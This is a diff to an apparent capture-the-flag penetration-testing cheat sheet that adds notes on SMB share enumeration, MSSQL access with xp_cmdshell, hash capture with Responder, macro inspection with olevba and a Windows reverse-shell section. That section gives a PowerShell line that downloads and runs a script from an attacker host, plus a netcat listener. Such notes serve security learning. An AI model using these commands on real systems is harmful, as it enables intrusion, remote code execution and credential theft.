@@ -20,10 +20,11 @@ Port Enumeration
 445 (smb/Samba)
 -----------------------
 
-* `smbmap`
+* [`smbmap`](https://github.com/ShawnDEvans/smbmap)
 
-
-	To try and list shares as the anonymous use **DO THIS** (this doesn't always work for some weird reason)
+	`smbmap` tells you permissions and access, which `smbclient` does _not_ do!
+	
+	To try and list shares as the anonymous user **DO THIS** (this doesn't always work for some weird reason)
 
 ```
 smbmap -H 10.10.10.125 -u anonymous
@@ -47,7 +48,6 @@ Worth trying `localhost` as a domain, if that gets "NO_LOGON_SERVERS"
 smbmap -H 10.10.10.125 -u anonymous -D localhost
 ```
 
-
 * `enum4linux`
 
 
@@ -57,20 +57,106 @@ enum4linux 10.10.10.125
 
 * `smbclient`
 
+	**NOTE: DEPENDING ON THE VERSION OF SMBCLIENT YOU ARE USING, you may need to SPECIFY the use of S<B version 1 or SMB version 2. You can dp this with `-m SMB2`. Older versions of SMBclient (latest being 4.10 at the time of writing) use SMB1 _by default_.** 
 
+	You can use `smbclient` to look through files shared with SMB. To _list_ available shares:
 
 ```	
-smbclient -N -L //10.10.10.125/
+smbclient -m SMB2 -N -L //10.10.10.125/
 ```
 
+Once you find a share you want to/can access, you can connect to shares by using the name following the locator:
+
+```
+smbclient -m SMB2 -N //10.10.10.125/Reports
+```
+
+You will see a `smb: \>` prompt, and you can use `ls` and `get` to retrieve files or even `put` if you need to place files there.
+
+1433 (Microsoft SQL Server)
+------------------------------
+
+* `impacket` -> `mssqlclient.py`
+	
+	You can connect to a Microsoft SQL Server with `myssqlclient.py` knowing a username and password like so:
+
+```
+mssqlclient.py username@10.10.10.125
+```
+	
+It will prompt you for a password. **If your password fails, the server might be using "Windows authentication", which you can use with:**
+
+```
+mssqlclient.py username@10.10.10.125 -windows-auth
+```
+
+If you have access to a Micosoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:
+
+```
+SQL> enable_xp_cmdshell
+``` 
+
+though, you may not have permission. If that DOES succeed, you can now run commands like:
+
+```
+SQL> xp_cmdshell whoami
+```
 
 SNMP
-=======================
+----------------
 
 * snmp-check
 
 ```
 snmp-check 10.10.10.125
+```
+
+
+Microsoft Office Macros
+---------------
+
+* [`oletools`](https://github.com/decalage2/oletools) -> `olevba`
+
+	`olevba` can look for Macros within office documents (which you should always check) with just supplying the filename:
+
+```
+olevba "Currency Volume Report.xlsm"
+```
+
+Retrieving Network Service Hashes
+----------------------------------
+
+
+* [`Responder.py`](https://github.com/SpiderLabs/Responder)
+
+
+```
+./Responder.py -I tun0
+```
+
+
+Windows Reverse Shells
+---------------------------
+
+
+* [Nishang][nishang]
+
+	If you have access to PowerShell,  you can get a Reverse shell by using [nishang]'s `Invoke-PowerShellTcp.ps1` script inside of the `Shells` directory. Be sure to add the function call example to the bottom of your script, so all you need to to do to host it is (on your Attacker machine):
+
+```
+python -m SimpleHTTPServer
+```
+
+and then on the victim machine:
+
+```
+powershell IEX( New-Object Net.WebClient).DownloadString("http://10.10.14.6:8000/reverse.ps1") )
+```
+
+Also, if you want to have nice up and down arrow key usage within your Windows reverse shell, you can use the utility `rlwrap` before your netcat listener command.
+
+```
+rlwrap nc -lnvp 9001
 ```
 
 
@@ -1209,3 +1295,8 @@ KGS!@#$%
 [Base65535]: https://github.com/qntm/base65536
 [Easy Python Decompiler]: https://github.com/aliansi/Easy-Python-Decompiler-v1.3.2
 [photorec]: https://www.cgsecurity.org/wiki/PhotoRec
+[smbmap]: https://github.com/ShawnDEvans/smbmap
+[oletools]: https://github.com/decalage2/oletools
+[impacket]: https://github.com/SecureAuthCorp/impacket
+[Responder]: https://github.com/SpiderLabs/Responder
+[Responder.py]: https://github.com/SpiderLabs/Responder
